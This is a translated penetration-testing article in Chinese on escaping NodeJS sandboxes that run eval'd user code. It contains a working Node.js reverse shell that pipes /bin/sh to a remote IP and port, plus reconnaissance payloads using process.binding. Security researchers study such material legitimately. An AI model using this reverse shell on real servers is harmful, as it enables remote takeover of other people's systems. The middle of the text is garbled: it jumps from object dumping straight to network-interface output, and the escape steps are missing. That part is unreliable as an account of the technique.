# NodeJS沙箱逃逸分析
|
##### 译文声明
本文是翻译文章，文章原作者 netspi，文章来源：blog.netspi.com
原文地址：
译文仅供参考，具体内容表达以及含义原文为准。
## 概述
在这篇文章中，我们将探索解释器的内部，从而找到逃逸NodeJS沙箱的方法。
NodeJS是一个基于Chrome V8 JavaScript引擎构建的JavaScript
Runtime，允许开发人员对应用程序的前端和后端，使用相同的编程语言和代码库。NodeJS最初于2009年发布，现在被Netflix、Microsoft和IBM等知名科技公司使用。如今，NodeJS的下载量已经超过250000000次，并且还在不断增长中。考虑到NodeJS的受欢迎程度，如今它已经成为Web应用程序测试过程中要探索的一个有趣目标。
在NodeJS之前，需要使用不同的服务器端语言，例如PHP或Perl，这些语言都有其自身的安全问题。然而，尽管NodeJS和JavaScript进行了改进，但由于其中的Eval()功能，使二者仍然存在命令注入方面的风险。
Eval函数允许应用程序在操作系统级别执行命令。当操作系统和应用层序之间不存在功能，或者将要进行的工作放到底层会变得更加容易时，开发人员会选择eval。使用该功能，可以实现不同级别的沙箱，从而防止攻击者获得服务器的底层运行权限。
接下来，我们将深入了解NodeJS，并了解如何在允许执行任意JavaScript的应用程序中实现NodeJS沙箱逃逸。
## 反向Shell
作为一名渗透测试人员，我们在某个系统上应该花费足够的时间，并且应该首先想到尝试反向Shell。识别反向连接的方法很简单，所以真正有趣的内容就开始了。在Wiremask的帮助下，我们可以在NodeJS中使用反向Shell：
    (function(){
    var net = require("net"),
    cp = require("child_process"),
    sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(8080, "192.168.1.1", function(){
    client.pipe(sh.stdin);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
    })();
如果我们足够幸运，沙箱的防护机制不强，或者沙箱根本就不存在，那么将会获得一个反向Shell，可以继续下面的步骤。但实际上，我们并不会总这么幸运，因此我们要逐步了解如何在当前环境中执行不需要的反向Shell。这是一种常见的沙箱技术，可以作为防范攻击者的第一道大门。如果无法导入NodeJS标准库，那么就无法轻松执行例如文件读写、建立网络连接这样的操作。现在，真正的工作开始了。
## 侦查阶段
任何渗透测试方法的第一步都是侦查。我们认为，要进行的目标是任意命令执行，但由于存在沙箱，所以必须从头突破。第一步，就是要确定执行过程中Payload的访问权限。最直接的方法就是触发栈跟踪，并查看输出。不幸的是，并非所有Web应用程序都会对栈进行跟踪并支持查看标准错误结果。我们可以使用Payload生成，并打印标准输出的栈跟踪。我们参考了StackOverflow上的一篇帖子（
），发现代码实际上非常简单，特别是对于更新的语言功能。如果无法实现直接的控制台访问，我们就必须使用Print语句，或者返回实际的跟踪结果，以下代码可以完成这一工作：
    function stackTrace() {
    var err = new Error();
    print(err.stack);
    }
运行这一Payload后，我们将获得栈的跟踪：
    Error
    at stackTrace (lodash.templateSources[3354]:49:19)
    at eval (lodash.templateSources[3354]:52:11)
    at Object.eval (lodash.templateSources[3354]:65:3)
    at evalmachine.:38:49
    at Array.map ()
    at resolveLodashTemplates (evalmachine.:25:25)
    at evalmachine.:59:3
    at ContextifyScript.Script.runInContext (vm.js:59:29)
    at Object.runInContext (vm.js:120:6)
    at /var/www/ClientServer/services/Router/sandbox.js:95:29
    ...
现在我们已经知道，我们在sandbox.js中，使用eval在lodash模板中运行。接下来，尝试找出当前代码的上下文。
我们进行了尝试，但发现并不能简单地打印出对象，必须要使用JSON.stringify()：
    > print(JSON.stringify(this))
     print(JSON.prune(this))
     var fs = this.process.binding('fs');
    > print(JSON.prune(fs));
     mtu 9001
    inet 192.168.1.1 netmask 255.255.240.0 broadcast 192.168.1.255
    ether de:ad:be:ee:ef:00 txqueuelen 1000 (Ethernet)
    RX packets 4344691 bytes 1198637148 (1.1 GiB)
    RX errors 0 dropped 0 overruns 0 frame 0
    TX packets 4377151 bytes 1646033264 (1.5 GiB)
    TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
    lo: flags=73 mtu 65536
    inet 127.0.0.1 netmask 255.0.0.0
    inet6 ::1 prefixlen 128 scopeid 0x10
    loop txqueuelen 1000 (Local Loopback)
    RX packets 126582565 bytes 25595751878 (23.8 GiB)
    RX errors 0 dropped 0 overruns 0 frame 0
    TX packets 126582565 bytes 25595751878 (23.8 GiB)
    TX errors 0 dropped 0 overruns 0 carrier 0 collisions 0
## 总结
从任意代码执行到反向Shell，我们最终实现了NodeJS中沙箱的逃逸，其实这一实现只是时间问题。在网络出现的后期，一些后端语言（例如PHP）中就存在此类漏洞，并且至今仍然困扰着我们。在这里，我们得到了一个经验教训，就是永远都不要信任用户的输入，永远都不要执行用户提供的代码。此外，对于测试者来说，如果能够对解释器内部的工作原理进行分析，往往能够更迅速地找到有效方法来突破沙箱。最后，经常进行系统的对抗，往往会产生积极的结果。